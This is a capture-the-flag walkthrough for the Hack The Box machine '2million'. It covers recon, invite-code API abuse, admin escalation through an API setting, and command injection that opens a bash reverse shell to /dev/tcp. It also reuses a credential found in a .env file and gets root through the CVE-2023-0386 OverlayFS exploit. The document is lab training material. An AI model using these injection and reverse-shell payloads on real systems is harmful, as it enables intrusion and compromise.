## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)](Easy)

## 🔍 Recon

### Nmap Scan
```bash
nmap -p- --min-rate 10000 10.10.10.11
nmap -p 22,80 -sCV 10.10.10.11
```

### Host File Entry
```bash
echo "10.10.10.11 2million.htb" | sudo tee -a /etc/hosts
```

### [FFUF – Subdomain Enumeration](HTTP)
```bash
ffuf -u http://10.10.10.11 -H "Host: FUZZ.2million.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac
```

### Feroxbuster – Directory Brute Force
```bash
feroxbuster -u http://2million.htb
```

---

## 🎟️ Invite Code Challenge

### ROT13 Decode (CLI)
```bash
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | jq -r '.data.data' | tr 'a-zA-Z' 'n-za-mN-ZA-M'
```

### Generate Invite Code
```bash
curl -X POST http://2million.htb/api/v1/invite/generate -s | jq .data.code | xargs echo | base64 -d
```

---

## 🔐 Login & API Enumeration

### Get API Description
```bash
curl -s http://2million.htb/api/v1 | jq .
```

---

## 👮 Admin Privilege Escalation via API

### Gain Admin Privs
```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
-H "Content-Type: application/json" \
-d '{"email":"<your_email>", "is_admin":1}' \
-b cookies.txt
```

### Confirm Admin
```bash
curl -s http://2million.htb/api/v1/admin/auth -b cookies.txt
```

---

## 💥 Command Injection (Admin VPN API)

### Basic Test
```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
-H "Content-Type: application/json" \
-d '{"username":"test; id #"}' -b cookies.txt
```

### Reverse Shell
```bash
# Listener
nc -lnvp 443

# Trigger
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
-H "Content-Type: application/json" \
-d '{"username":"; bash -c \"bash -i >& /dev/tcp/<your_ip>/443 0>&1\" #"}' \
-b cookies.txt
```

---

## 🧑‍💻 Shell as `admin`

### Credential in .env
```bash
cat /var/www/html/.env
# admin : SuperDuperPass123
```

### [SSH](SSH) / su as admin
```bash
su - admin
# or
sshpass -p 'SuperDuperPass123' ssh admin@2million.htb
```

---

## 🧑‍🔬 Privilege Escalation to root

### Kernel Info
```bash
uname -a
cat /etc/lsb-release
```

### Vulnerability: CVE-2023-0386 (OverlayFS)
Exploit repo: https://github.com/xkaneiki/CVE-2023-0386

### Steps
```bash
# Upload & unzip
scp CVE-2023-0386-main.zip admin@2million.htb:/tmp/
unzip CVE-2023-0386-main.zip && cd CVE-2023-0386-main

# Build
make all

# Start fuse script in terminal 1
./fuse ./ovlcap/lower ./gc

# Run exploit in terminal 2
./exp
```

If successful:
```bash
whoami
# root
```

---

## 📦 Beyond Root – Decode `thank_you.json`

### Decode Steps (CyberChef or CLI)
1. URL Decode
2. From Hex
3. From Base64
4. XOR with key: `HackTheBox`